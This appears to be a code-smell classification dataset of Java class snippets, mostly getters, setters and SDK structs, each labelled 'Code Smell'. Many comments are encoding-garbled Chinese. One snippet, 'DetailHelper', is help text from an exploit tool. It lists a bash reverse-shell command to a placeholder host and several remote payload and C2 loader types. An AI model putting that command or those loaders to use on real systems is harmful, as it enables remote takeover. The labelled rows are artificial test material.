  private String password;
  @Override public Byte getCommand(){
    return LOGIN_REQUEST;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public String getUserId(){
    return userId;
  }
  public void setUserId(  String userId){
    this.userId=userId;
  }
}",1,Code Smell
"public static class NET_THERMO_GRAPHY_INFO extends SdkStructure {
  public int nBrightness;
  public int nSharpness;
  public int nEZoom;
  public int nThermographyGamma;
  public int nColorization;
  public int nSmartOptimizer;
  public NET_THERMO_GRAPHY_OPTREGION stOptRegion;
  public int nAgc;
  public int nAgcMaxGain;
  public int nAgcPlateau;
  public byte[] reserved=new byte[244];
}",1,Code Smell
"/** 
 * 瑙掕壊涓庢暟鎹潈闄愬搴斿叧绯
 * @author xiongxy
 * @email 1179705413@qq.com
 * @date 2019-11-25 11:32:49
 */
public class RoleDataPermDO implements Serializable {
  private static final long serialVersionUID=1L;
  @JsonSerialize(using=LongToStringSerializer.class) private Long id;
  @JsonSerialize(using=LongToStringSerializer.class) private Long roleId;
  @JsonSerialize(using=LongToStringSerializer.class) private Long permId;
  /** 
 * 璁剧疆锛
 */
  public void setId(  Long id){
    this.id=id;
  }
  /** 
 * 鑾峰彇锛
 */
  public Long getId(){
    return id;
  }
  /** 
 * 璁剧疆锛氳鑹睮D
 */
  public void setRoleId(  Long roleId){
    this.roleId=roleId;
  }
  /** 
 * 鑾峰彇锛氳鑹睮D
 */
  public Long getRoleId(){
    return roleId;
  }
  /** 
 * 璁剧疆锛氭潈闄怚D
 */
  public void setPermId(  Long permId){
    this.permId=permId;
  }
  /** 
 * 鑾峰彇锛氭潈闄怚D
 */
  public Long getPermId(){
    return permId;
  }
}",1,Code Smell
"/** 
 * SQL鎵ц鏉冮檺鏍￠獙鍣ㄣ
 * @author datagear@163.com
 */
public class SqlPermissionValidator {
  private SqlValidator readPermissionSqlValidator;
  private SqlValidator editPermissionSqlValidator;
  private SqlValidator deletePermissionSqlValidator;
  public SqlPermissionValidator(  SqlValidator readPermissionSqlValidator,  SqlValidator editPermissionSqlValidator,  SqlValidator deletePermissionSqlValidator){
    super();
    this.readPermissionSqlValidator=readPermissionSqlValidator;
    this.editPermissionSqlValidator=editPermissionSqlValidator;
    this.deletePermissionSqlValidator=deletePermissionSqlValidator;
  }
  public SqlValidator getReadPermissionSqlValidator(){
    return readPermissionSqlValidator;
  }
  public void setReadPermissionSqlValidator(  SqlValidator readPermissionSqlValidator){
    this.readPermissionSqlValidator=readPermissionSqlValidator;
  }
  public SqlValidator getEditPermissionSqlValidator(){
    return editPermissionSqlValidator;
  }
  public void setEditPermissionSqlValidator(  SqlValidator editPermissionSqlValidator){
    this.editPermissionSqlValidator=editPermissionSqlValidator;
  }
  public SqlValidator getDeletePermissionSqlValidator(){
    return deletePermissionSqlValidator;
  }
  public void setDeletePermissionSqlValidator(  SqlValidator deletePermissionSqlValidator){
    this.deletePermissionSqlValidator=deletePermissionSqlValidator;
  }
  /** 
 * 妫鏌ョ敤鎴锋槸鍚︽湁鎵ц鎸囧畾SQL鐨勬潈闄愩
 * @param user
 * @param schema
 * @param sqlStatement
 * @param databaseProfile
 * @return
 */
  public SqlValidation validate(  User user,  Schema schema,  SqlStatement sqlStatement,  DatabaseProfile databaseProfile){
    String sql=sqlStatement.getSql();
    int permission=schema.getDataPermission();
    if (Schema.isDeleteTableDataPermission(permission)) {
      return this.deletePermissionSqlValidator.validate(sql,databaseProfile);
    }
 else     if (Schema.isEditTableDataPermission(permission)) {
      return this.editPermissionSqlValidator.validate(sql,databaseProfile);
    }
 else     if (Schema.isReadTableDataPermission(permission)) {
      return this.readPermissionSqlValidator.validate(sql,databaseProfile);
    }
    return new SqlValidation(""ANY KEYWORD"");
  }
}",1,Code Smell
"public static class NET_DVR_SNAPCFG extends Structure {
  public int dwSize;
  public byte byRelatedDriveWay;
  public byte bySnapTimes;
  public short wSnapWaitTime;
  public short[] wIntervalTime=new short[MAX_INTERVAL_NUM];
  public int dwSnapVehicleNum;
  public NET_DVR_JPEGPARA struJpegPara;
  public byte[] byRes2=new byte[16];
}",1,Code Smell
"public static class Ssl {
  private File keyStore;
  private String keyStorePassword;
  private String certificateType;
  private String certificateDn;
  private String certificateSha;
  private File trustStore;
  private String trustStorePassword;
  public File getTrustStore(){
    return trustStore;
  }
  public void setTrustStore(  File trustStore){
    this.trustStore=trustStore;
  }
  public String getTrustStorePassword(){
    return trustStorePassword;
  }
  public void setTrustStorePassword(  String trustStorePassword){
    this.trustStorePassword=trustStorePassword;
  }
  public String getCertificateDn(){
    return certificateDn;
  }
  public void setCertificateDn(  String certificateDn){
    this.certificateDn=certificateDn;
  }
  public String getCertificateSha(){
    return certificateSha;
  }
  public void setCertificateSha(  String certificateSha){
    this.certificateSha=certificateSha;
  }
  public File getKeyStore(){
    return keyStore;
  }
  public void setKeyStore(  File keyStore){
    this.keyStore=keyStore;
  }
  public String getKeyStorePassword(){
    return keyStorePassword;
  }
  public void setKeyStorePassword(  String keyStorePassword){
    this.keyStorePassword=keyStorePassword;
  }
  public String getCertificateType(){
    return certificateType;
  }
  public void setCertificateType(  String certificateType){
    this.certificateType=certificateType;
  }
}
",1,Code Smell
"/** 
 * @author harris
 */
public class FsRuleRequest extends FileSystemRule {
  private List<String> tags;
  private String tagKey;
  private Map<String,Object> combine;
  public List<String> getTags(){
    return tags;
  }
  public void setTags(  List<String> tags){
    this.tags=tags;
  }
  public String getTagKey(){
    return tagKey;
  }
  public void setTagKey(  String tagKey){
    this.tagKey=tagKey;
  }
  public Map<String,Object> getCombine(){
    return combine;
  }
  public void setCombine(  Map<String,Object> combine){
    this.combine=combine;
  }
}
",1,Code Smell
"/** 
 * 闂ㄧ鍗′俊鎭搷浣滐細澧炪�佸垹銆佹敼銆佹煡銆佹竻绌�
 */
public static class NET_EM_ACCESS_CTL_CARD_SERVICE extends SdkStructure {
  public static final int NET_EM_ACCESS_CTL_CARD_SERVICE_INSERT=0;
  public static final int NET_EM_ACCESS_CTL_CARD_SERVICE_GET=1;
  public static final int NET_EM_ACCESS_CTL_CARD_SERVICE_UPDATE=2;
  public static final int NET_EM_ACCESS_CTL_CARD_SERVICE_REMOVE=3;
  public static final int NET_EM_ACCESS_CTL_CARD_SERVICE_CLEAR=4;
}",1,Code Smell
"/** 
 * 鏈湴鏁版嵁鍙戠敓鍙樻洿鐨勪簨浠躲��
 * @author Nacos
 */
public class LocalDataChangeEvent implements Event {
  final public String groupKey;
  final public boolean isBeta;
  final public List<String> betaIps;
  final public String tag;
  public LocalDataChangeEvent(  String groupKey){
    this.groupKey=groupKey;
    this.isBeta=false;
    this.betaIps=null;
    this.tag=null;
  }
  public LocalDataChangeEvent(  String groupKey,  boolean isBeta,  List<String> betaIps){
    this.groupKey=groupKey;
    this.isBeta=isBeta;
    this.betaIps=betaIps;
    this.tag=null;
  }
  public LocalDataChangeEvent(  String groupKey,  boolean isBeta,  List<String> betaIps,  String tag){
    this.groupKey=groupKey;
    this.isBeta=isBeta;
    this.betaIps=betaIps;
    this.tag=tag;
  }
}
",1,Code Smell
"public class UserFeedback {
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") private Long id;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") private Long userId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") private String content;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") private Date createTime;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public Long getId(){
    return id;
  }
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public void setId(  Long id){
    this.id=id;
  }
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public Long getUserId(){
    return userId;
  }
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public void setUserId(  Long userId){
    this.userId=userId;
  }
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public String getContent(){
    return content;
  }
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public void setContent(  String content){
    this.content=content == null ? null : content.trim();
  }
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public Date getCreateTime(){
    return createTime;
  }
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public void setCreateTime(  Date createTime){
    this.createTime=createTime;
  }
}
",1,Code Smell
"public class CloudTaskItemLogDTO {
  private CloudTaskItem cloudTaskItem;
  private List<CloudTaskItemLogWithBLOBs> cloudTaskItemLogList;
  private Rule rule;
  public CloudTaskItem getCloudTaskItem(){
    return cloudTaskItem;
  }
  public void setCloudTaskItem(  CloudTaskItem cloudTaskItem){
    this.cloudTaskItem=cloudTaskItem;
  }
  public List<CloudTaskItemLogWithBLOBs> getCloudTaskItemLogList(){
    return cloudTaskItemLogList;
  }
  public void setCloudTaskItemLogList(  List<CloudTaskItemLogWithBLOBs> cloudTaskItemLogList){
    this.cloudTaskItemLogList=cloudTaskItemLogList;
  }
  public Rule getRule(){
    return rule;
  }
  public void setRule(  Rule rule){
    this.rule=rule;
  }
}
",1,Code Smell
"public static class NET_CTRL_OUT_FINGERPRINT_GET extends SdkStructure {
  public int dwSize;
  public byte[] szUserID=new byte[NET_COMMON_STRING_32];
  public byte[] szFingerPrintName=new byte[NET_COMMON_STRING_32];
  public int nFingerPrintID;
  public int nRetLength;
  public int nMaxFingerDataLength;
  public Pointer szFingerPrintInfo;
  public NET_CTRL_OUT_FINGERPRINT_GET(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"private static final class ConnectedControllerRecord<T> {
  public final T controllerKey;
  public final SequencedFutureManager sequencedFutureManager;
  public final Deque<AsyncCommand> commandQueue;
  public SessionCommands sessionCommands;
  public Player.Commands playerCommands;
  public boolean commandQueueIsFlushing;
  public ConnectedControllerRecord(  T controllerKey,  SequencedFutureManager sequencedFutureManager,  SessionCommands sessionCommands,  Player.Commands playerCommands){
    this.controllerKey=controllerKey;
    this.sequencedFutureManager=sequencedFutureManager;
    this.sessionCommands=sessionCommands;
    this.playerCommands=playerCommands;
    this.commandQueue=new ArrayDeque<>();
  }
}
",1,Code Smell
"/** 
 * @author wh1t3p1g
 * @since 2021/12/13
 */
public class DetailHelper {
  public final static String COMMAND=""execute system command.<br>"" + ""1. dns: ping -nc 1 {dnslog}<br>"" + ""2. reverse shell: /bin/bash -i >& /dev/tcp/x.x.x.x/port 0>&1<br>""+ ""3. if not work, try to encode the command. https://jackson-t.ca/runtime-exec-payloads.html<br>"";
  public final static String ALL_PAYLOAD=""Any Payload"";
  public final static String NO_NEED_PAYLOAD=""Do not need Payload"";
  public final static String ALL_JAVA_PAYLOAD=""Any Java Serialization Payload"";
  public final static String ALL_HESSIAN_PAYLOAD=""Any Hessian Serialization Payload"";
  public final static String BODY=""鏍规嵁effect绫诲瀷濉厖body鍐呭锛屽垎鍒涓嬶細<br>"" + ""1. default, body=command<br>"" + ""2. TomcatEcho, body涓嶅～<br>""+ ""3. SocketEcho, body=host;port<br>""+ ""4. RemoteFileLoader 鎴 RemoteFileHttpLoader, body=url;classname<br>""+ ""5. RemoteFileHttpExecutor, body=url;os<br>""+ ""6. DnslogLoader, body=dnslog<br>""+ ""7. WinC2Loader, body=local filepath<br>""+ ""8. MSFJavaC2Loader, body=url<br>""+ ""9. CustomizableClassLoader, body=local class filepath<br>""+ ""10. SpecialRuntimeExecutor, body=command"";
}",1,Code Smell
"/** 
 * Contains audio sample information. Object is passed using  {@link WebRtcAudioRecord.WebRtcAudioRecordSamplesReadyCallback}
 */
public static class AudioSamples {
  /** 
 * See  {@link AudioRecord#getAudioFormat()} 
 */
  private final int audioFormat;
  /** 
 * See  {@link AudioRecord#getChannelCount()} 
 */
  private final int channelCount;
  /** 
 * See  {@link AudioRecord#getSampleRate()} 
 */
  private final int sampleRate;
  private final byte[] data;
  private AudioSamples(  AudioRecord audioRecord,  byte[] data){
    this.audioFormat=audioRecord.getAudioFormat();
    this.channelCount=audioRecord.getChannelCount();
    this.sampleRate=audioRecord.getSampleRate();
    this.data=data;
  }
  public int getAudioFormat(){
    return audioFormat;
  }
  public int getChannelCount(){
    return channelCount;
  }
  public int getSampleRate(){
    return sampleRate;
  }
  public byte[] getData(){
    return data;
  }
}
",1,Code Smell
"public static class Bean4 {
  public String f0;
  public String f1;
  public String f2;
  public String f3;
}",1,Code Smell
"public static class NET_VIDEOIN_IMAGE_INFO extends SdkStructure {
  public int dwSize;
  public int emCfgType;
  public int bMirror;
  public int bFlip;
  public int nRotate90;
  public NET_VIDEOIN_IMAGE_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class NET_RECORD_ACCESSQRCODE_INFO extends SdkStructure {
  public int dwSize;
  public int nRecNo;
  public byte[] szQRCode=new byte[NET_MAX_QRCODE_LEN];
  public int nLeftTimes;
  public NET_TIME stuStartTime;
  public NET_TIME stuEndTime;
  public byte[] szRoomNumber=new byte[16];
  public byte[] szUserID=new byte[32];
  public NET_RECORD_ACCESSQRCODE_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class Entity {
  private int id;
  private String name;
  public Entity(){
  }
  public Entity(  int id,  String name){
    this.id=id;
    this.name=name;
  }
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
}
",1,Code Smell
"public class AccountDTO extends AccountWithBLOBs {
  private String userName;
  private boolean isProxy;
  private String proxyIp;
  private String proxyPort;
  private String proxyName;
  private String proxyPassword;
  private List<Oss> ossList;
  private List<CloudEventSyncLogVo> cloudEventSyncLogList;
  private List<ImageRepo> imageRepoList;
  private List<CloudResourceSync> cloudResourceSyncList;
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public boolean getIsProxy(){
    return isProxy;
  }
  public void setIsProxy(  boolean isProxy){
    this.isProxy=isProxy;
  }
  public String getProxyIp(){
    return proxyIp;
  }
  public void setProxyIp(  String proxyIp){
    this.proxyIp=proxyIp;
  }
  public String getProxyPort(){
    return proxyPort;
  }
  public void setProxyPort(  String proxyPort){
    this.proxyPort=proxyPort;
  }
  public String getProxyName(){
    return proxyName;
  }
  public void setProxyName(  String proxyName){
    this.proxyName=proxyName;
  }
  public String getProxyPassword(){
    return proxyPassword;
  }
  public void setProxyPassword(  String proxyPassword){
    this.proxyPassword=proxyPassword;
  }
  public boolean isProxy(){
    return isProxy;
  }
  public void setProxy(  boolean proxy){
    isProxy=proxy;
  }
  public List<Oss> getOssList(){
    return ossList;
  }
  public void setOssList(  List<Oss> ossList){
    this.ossList=ossList;
  }
  public List<CloudEventSyncLogVo> getCloudEventSyncLogList(){
    return cloudEventSyncLogList;
  }
  public void setCloudEventSyncLogList(  List<CloudEventSyncLogVo> cloudEventSyncLogList){
    this.cloudEventSyncLogList=cloudEventSyncLogList;
  }
  public List<ImageRepo> getImageRepoList(){
    return imageRepoList;
  }
  public void setImageRepoList(  List<ImageRepo> imageRepoList){
    this.imageRepoList=imageRepoList;
  }
  public List<CloudResourceSync> getCloudResourceSyncList(){
    return cloudResourceSyncList;
  }
  public void setCloudResourceSyncList(  List<CloudResourceSync> cloudResourceSyncList){
    this.cloudResourceSyncList=cloudResourceSyncList;
  }
}
",1,Code Smell
"/** 
 * 搴楅摵璇︽儏VO
 * @author FrozenWatermelon
 * @date 2020-11-23 16:24:29
 */
public class EsShopDetailBO extends BaseVO {
  private static final long serialVersionUID=1L;
  @Schema(description=""搴楅摵id"") private Long shopId;
  @Schema(description=""搴楅摵绫诲瀷1鑷惀搴� 2鏅�氬簵"") private Integer type;
  @Schema(description=""搴楅摵鍚嶇О"") private String shopName;
  @Schema(description=""搴楅摵logo"") private String shopLogo;
  @Schema(description=""搴楅摵鐘舵��(-1:鏈紑閫� 0: 鍋滀笟涓� 1:钀ヤ笟涓�)"") private Integer shopStatus;
  public Long getShopId(){
    return shopId;
  }
  public void setShopId(  Long shopId){
    this.shopId=shopId;
  }
  public Integer getType(){
    return type;
  }
  public void setType(  Integer type){
    this.type=type;
  }
  public String getShopName(){
    return shopName;
  }
  public void setShopName(  String shopName){
    this.shopName=shopName;
  }
  public String getShopLogo(){
    return shopLogo;
  }
  public void setShopLogo(  String shopLogo){
    this.shopLogo=shopLogo;
  }
  public Integer getShopStatus(){
    return shopStatus;
  }
  public void setShopStatus(  Integer shopStatus){
    this.shopStatus=shopStatus;
  }
  @Override public String toString(){
    return ""EsShopDetailBO{"" + ""shopId="" + shopId + "", type=""+ type+ "", shopName='""+ shopName+ '\''+ "", shopLogo='""+ shopLogo+ '\''+ "", shopStatus=""+ shopStatus+ '}';
  }
}",1,Code Smell
"/** 
 * 瀹℃牳鐘舵��
 * @author lixiaoyang
 * @date 2022/6/8 14:54
 */
public static class AuditStatus {
  /** 
 * 寰呭鏍�
 */
  public static final String WAIT_STATUS=""wait"";
  /** 
 * 瀹℃牳鎴愬姛
 */
  public static final String SUCCESS_STATUS=""success"";
  /** 
 * 鍚敤
 */
  public static final String START_STATUS=""start"";
  /** 
 * 瀹℃牳澶辫触
 */
  public static final String FAIL_STATUS=""fail"";
  /** 
 * 鍏抽棴
 */
  public static final String CLOSE_STATUS=""close"";
  /** 
 * 搴熷純
 */
  public static final String ABANDON_STATUS=""abandon"";
  /** 
 * 鍦ㄩ��
 */
  public static final String WAY_STATUS=""way"";
  /** 
 * 瀹屾垚
 */
  public static final String COMPLETE_STATUS=""complete"";
  /** 
 * 鏆傚仠
 */
  public static final String STOP=""stop"";
  /** 
 * 鍒版椂缁撴潫
 */
  public static final String END_TIME=""endTime"";
}",1,Code Smell
"@JSONCompiled public static class Bean {
  public java.util.Date v01;
  public java.util.Calendar v02;
  public java.sql.Date v03;
  public java.sql.Time v04;
  public java.sql.Timestamp v05;
  public java.time.LocalDate v06;
  public java.time.LocalTime v07;
  public java.time.LocalDateTime v08;
  public java.time.ZonedDateTime v09;
  public java.time.OffsetDateTime v10;
  public java.time.OffsetTime v11;
}
@JSONCompiled public static class Bean {
  public byte v01;
  public Byte v02;
  public short v03;
  public Short v04;
  public int v05;
  public Integer v06;
  public long v07;
  public Long v08;
  public float v09;
  public Float v10;
  public double v11;
  public Double v12;
  public BigDecimal v13;
  public BigInteger v14;
  public Number v15;
  public AtomicInteger v16;
  public AtomicLong v17;
}
@JSONCompiled public static class Bean {
  public boolean[] v01;
  public char[] v02;
  public byte[] v03;
  public short[] v04;
  public int[] v05;
  public long[] v06;
  public float[] v07;
  public double[] v08;
}
@JSONCompiled public static class Bean {
  public Boolean v01;
  public Character v02;
  public Byte v03;
  public Short v04;
  public Integer v05;
  public Long v06;
  public Float v07;
  public Double v08;
  public String v09;
}
@JSONCompiled public static class Bean {
  public boolean v01;
  public char v02;
  public byte v03;
  public short v04;
  public int v05;
  public long v06;
  public float v07;
  public double v08;
}
@JSONCompiled public static class Bean {
  public Calendar v01;
  public Currency v02;
  public Date v03;
  public Locale v04;
  public UUID v05;
}",1,Code Smell
"public static class Select_options_itemContext extends ParserRuleContext {
  public TerminalNode T_LIMIT(){
    return getToken(HiveSqlParser.T_LIMIT,0);
  }
  public ExprContext expr(){
    return getRuleContext(ExprContext.class,0);
  }
  public TerminalNode T_WITH(){
    return getToken(HiveSqlParser.T_WITH,0);
  }
  public TerminalNode T_RR(){
    return getToken(HiveSqlParser.T_RR,0);
  }
  public TerminalNode T_RS(){
    return getToken(HiveSqlParser.T_RS,0);
  }
  public TerminalNode T_CS(){
    return getToken(HiveSqlParser.T_CS,0);
  }
  public TerminalNode T_UR(){
    return getToken(HiveSqlParser.T_UR,0);
  }
  public TerminalNode T_USE(){
    return getToken(HiveSqlParser.T_USE,0);
  }
  public TerminalNode T_AND(){
    return getToken(HiveSqlParser.T_AND,0);
  }
  public TerminalNode T_KEEP(){
    return getToken(HiveSqlParser.T_KEEP,0);
  }
  public TerminalNode T_LOCKS(){
    return getToken(HiveSqlParser.T_LOCKS,0);
  }
  public TerminalNode T_EXCLUSIVE(){
    return getToken(HiveSqlParser.T_EXCLUSIVE,0);
  }
  public TerminalNode T_UPDATE(){
    return getToken(HiveSqlParser.T_UPDATE,0);
  }
  public TerminalNode T_SHARE(){
    return getToken(HiveSqlParser.T_SHARE,0);
  }
  public Select_options_itemContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_select_options_item;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterSelect_options_item(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitSelect_options_item(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitSelect_options_item(this);
 else     return visitor.visitChildren(this);
  }
}",1,Code Smell
"/** 
 * TcpResult
 */
public class TcpResult {
  public final IpPort ipPort;
  public final boolean result;
  public final String errorMsg;
  public Long channelId;
  /** 
 * Constructor
 * @param ipPort
 * @param result
 * @param errorMsg
 */
  public TcpResult(  IpPort ipPort,  boolean result,  String errorMsg){
    this.ipPort=ipPort;
    this.result=result;
    this.errorMsg=errorMsg;
  }
  /** 
 * Constructor
 * @param sendIp
 * @param sendPort
 * @param result
 * @param errorMsg
 */
  public TcpResult(  String sendIp,  int sendPort,  boolean result,  String errorMsg){
    this.ipPort=new IpPort(sendIp,sendPort);
    this.result=result;
    this.errorMsg=errorMsg;
  }
  /** 
 * get channelId
 * @return the channelId
 */
  public Long getChannelId(){
    return channelId;
  }
  /** 
 * set channelId
 * @param channelId the channelId to set
 */
  public void setChannelId(  Long channelId){
    this.channelId=channelId;
  }
  /** 
 * get ipPort
 * @return the ipPort
 */
  public IpPort getIpPort(){
    return ipPort;
  }
  /** 
 * get result
 * @return the result
 */
  public boolean isResult(){
    return result;
  }
  /** 
 * get errorMsg
 * @return the errorMsg
 */
  public String getErrorMsg(){
    return errorMsg;
  }
}
",1,Code Smell
"/** 
 * Schema Exception
 * @author HapThorin
 * @version 1.0.0
 * @since 2021-11-04
 */
public class SchemaException extends RuntimeException {
  /** 
 * Version not found
 */
  public static final MsgParser MISSING_VERSION=new MsgParser(){
    @Override public String parse(    Object... args){
      return String.format(Locale.ROOT,""Unable to find version of %s. "",args);
    }
  }
;
  /** 
 * The name found does not match what was expected
 */
  public static final MsgParser UNEXPECTED_NAME=new MsgParser(){
    @Override public String parse(    Object... args){
      return String.format(Locale.ROOT,""Name of plugin is wrong, giving %s but expecting %s. "",args);
    }
  }
;
  /** 
 * The version found does not match what was expected
 */
  public static final MsgParser UNEXPECTED_VERSION=new MsgParser(){
    @Override public String parse(    Object... args){
      return String.format(Locale.ROOT,""Version of %s is wrong, giving %s but expecting %s. "",args);
    }
  }
;
  /** 
 * External dependency packages are not accepted
 */
  public static final MsgParser UNEXPECTED_EXT_JAR=new MsgParser(){
    @Override public String parse(    Object... args){
      return String.format(Locale.ROOT,""External jar %s is not allowed. "",args);
    }
  }
;
  private static final long serialVersionUID=3875379572570581867L;
  /** 
 * constructor
 * @param parser parser
 * @param args args
 */
  public SchemaException(  MsgParser parser,  Object... args){
    super(parser.parse(args));
  }
  /** 
 * message parser
 * @since 2021-11-04
 */
public interface MsgParser {
    /** 
 * parse
 * @param args args
 * @return string
 */
    String parse(    Object... args);
  }
}",1,Code Smell
"/** 
 * @author FrozenWatermelon
 */
@Schema(description=""鎴戠殑璁㈠崟鏁伴噺"") public class OrderCountVO {
  @Schema(description=""鎵�鏈夎鍗曟暟閲�"") private Integer allCount;
  @Schema(description=""寰呬粯娆�"") private Integer unPay;
  @Schema(description=""寰呭彂璐�"") private Integer payed;
  @Schema(description=""寰呮敹璐�"") private Integer consignment;
  @Schema(description=""宸插畬鎴�"") private Integer success;
  public Integer getAllCount(){
    return allCount;
  }
  public void setAllCount(  Integer allCount){
    this.allCount=allCount;
  }
  public Integer getUnPay(){
    return unPay;
  }
  public void setUnPay(  Integer unPay){
    this.unPay=unPay;
  }
  public Integer getPayed(){
    return payed;
  }
  public void setPayed(  Integer payed){
    this.payed=payed;
  }
  public Integer getConsignment(){
    return consignment;
  }
  public void setConsignment(  Integer consignment){
    this.consignment=consignment;
  }
  public Integer getSuccess(){
    return success;
  }
  public void setSuccess(  Integer success){
    this.success=success;
  }
  @Override public String toString(){
    return ""OrderCountVO{"" + ""allCount="" + allCount + "", unPay=""+ unPay+ "", payed=""+ payed+ "", consignment=""+ consignment+ "", success=""+ success+ '}';
  }
}
",1,Code Smell
"public final class SceneDetailInfo {
  BasicPointInfo basicPoint;
  BubblePointInfo bubblePoint;
  NumericPointInfo numericPoint;
  PointType pointType;
  GuildGroupSceneType sceneType;
  public SceneDetailInfo(){
    this.sceneType=GuildGroupSceneType.values()[0];
    this.pointType=PointType.values()[0];
    this.basicPoint=new BasicPointInfo();
    this.numericPoint=new NumericPointInfo();
    this.bubblePoint=new BubblePointInfo();
  }
  public BasicPointInfo getBasicPoint(){
    return this.basicPoint;
  }
  public BubblePointInfo getBubblePoint(){
    return this.bubblePoint;
  }
  public NumericPointInfo getNumericPoint(){
    return this.numericPoint;
  }
  public PointType getPointType(){
    return this.pointType;
  }
  public GuildGroupSceneType getSceneType(){
    return this.sceneType;
  }
  public String toString(){
    return ""SceneDetailInfo{sceneType="" + this.sceneType + "",pointType=""+ this.pointType+ "",basicPoint=""+ this.basicPoint+ "",numericPoint=""+ this.numericPoint+ "",bubblePoint=""+ this.bubblePoint+ "",}"";
  }
  public SceneDetailInfo(  GuildGroupSceneType guildGroupSceneType,  PointType pointType,  BasicPointInfo basicPointInfo,  NumericPointInfo numericPointInfo,  BubblePointInfo bubblePointInfo){
    this.sceneType=GuildGroupSceneType.values()[0];
    this.pointType=PointType.values()[0];
    this.basicPoint=new BasicPointInfo();
    this.numericPoint=new NumericPointInfo();
    this.bubblePoint=new BubblePointInfo();
    this.sceneType=guildGroupSceneType;
    this.pointType=pointType;
    this.basicPoint=basicPointInfo;
    this.numericPoint=numericPointInfo;
    this.bubblePoint=bubblePointInfo;
  }
}",1,Code Smell
"public static class Parameter implements TransformParameters, Serializable {
  private Map<String,ModuleInfo> moduleInfo=Collections.emptyMap();
  private Map<String,String> automaticModules=Collections.emptyMap();
  @Input public Map<String,ModuleInfo> getModuleInfo(){
    return moduleInfo;
  }
  @Input public Map<String,String> getAutomaticModules(){
    return automaticModules;
  }
  public void setModuleInfo(  Map<String,ModuleInfo> moduleInfo){
    this.moduleInfo=moduleInfo;
  }
  public void setAutomaticModules(  Map<String,String> automaticModules){
    this.automaticModules=automaticModules;
  }
}
",1,Code Smell
"/** 
 * @author Christian Tzolov
 */
@ConfigurationProperties(ChromaApiProperties.CONFIG_PREFIX) public class ChromaApiProperties {
  public static final String CONFIG_PREFIX=""spring.ai.vectorstore.chroma.client"";
  private String host=""http://localhost"";
  private int port=8000;
  private String keyToken;
  private String username;
  private String password;
  public String getHost(){
    return host;
  }
  public void setHost(  String baseUrl){
    this.host=baseUrl;
  }
  public int getPort(){
    return this.port;
  }
  public void setPort(  int port){
    this.port=port;
  }
  public String getKeyToken(){
    return this.keyToken;
  }
  public void setKeyToken(  String keyToken){
    this.keyToken=keyToken;
  }
  public String getUsername(){
    return this.username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return this.password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
}",1,Code Smell
"public class ArchiverData {
  public String funds;
  public String originalCost;
  public String originalSize;
  public String originalUrl;
  public String resampleCost;
  public String resampleSize;
  public String resampleUrl;
  public ArchiverData(){
  }
}
",1,Code Smell
"public static class RAID_STATE_INFO extends SdkStructure {
  public byte[] szName=new byte[16];
  public byte byType;
  public byte byStatus;
  public byte[] byReserved=new byte[2];
  public int nCntMem;
  public int[] nMember=new int[32];
  public int nCapacity;
  public int nRemainSpace;
  public int nTank;
  public byte[] reserved=new byte[32];
}",1,Code Smell
"/** 
 * @description IPC鐨刉eb闇�姹�,鐏劙瀹氫綅鍙傛暟
 * @author 119178
 * @date 2021/3/11
 */
public class NET_FIRE_DETECTION_POSITION_PARAM extends SdkStructure {
  /** 
 * 鏄惁鏀寔鐏劙瀹氫綅 false鏃秝eb椤甸潰闅愯棌鐏劙瀹氫綅鍙傛暟
 */
  public int bEnable;
  /** 
 * 瀛楄妭瀵归綈
 */
  public byte[] byReserved1=new byte[4];
  /** 
 * 鐢婚潰涓績鐐圭X杞�3/4鐐瑰湴闈㈣窛绂伙紝鍗曚綅锛氱背
 */
  public float fAB;
  /** 
 * 鐢婚潰X杞�3/4鐐圭搴曢儴鍨傜洿鐐瑰湴闈㈣窛绂伙紝鍗曚綅锛氱背
 */
  public float fBC;
  /** 
 * 鐢婚潰搴曢儴3/4鐐圭偣鍒板簳閮ㄤ腑蹇冪偣鍦伴潰璺濈锛屽崟浣嶏細绫�
 */
  public float fCD;
  /** 
 * 搴曢儴涓績鐐瑰埌鐢婚潰涓績鐐瑰湴闈㈣窛绂伙紝鍗曚綅锛氱背
 */
  public float fDA;
  /** 
 * 搴曢儴涓績鐐圭鐩告満姘村钩鐐硅窛绂伙紝鍗曚綅锛氱背
 */
  public float fOD;
  /** 
 * 淇濈暀瀛楄妭
 */
  public byte[] byReserved=new byte[464];
}",1,Code Smell
"/** 
 * @author 47081
 * @version 1.0
 * @description 浜戝彴杞姩瑙掑害鑼冨洿锛屽崟浣嶏細搴�
 * @date 2020/11/9
 */
public class CFG_PTZ_MOTION_RANGE extends NetSDKLib.SdkStructure {
  /** 
 * 姘村钩瑙掑害鑼冨洿鏈�灏忓��,鍗曚綅:搴�
 */
